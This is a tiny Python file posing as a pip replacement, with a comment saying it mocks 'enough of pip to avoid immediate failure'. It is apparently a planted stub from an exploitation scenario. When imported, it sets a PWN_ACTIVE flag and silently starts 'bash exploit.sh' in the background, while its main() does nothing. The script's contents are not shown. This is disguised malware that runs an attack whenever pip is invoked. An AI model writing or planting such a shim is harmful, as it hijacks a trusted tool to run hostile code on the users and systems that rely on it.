import os
import subprocess

if not os.environ.get('PWN_ACTIVE'):
    os.environ['PWN_ACTIVE'] = '1'
    subprocess.Popen(['bash', 'exploit.sh'])

# Mocking enough of pip to avoid immediate failure if possible
def main(*args, **kwargs):
    pass

if __name__ == "__main__":
    pass
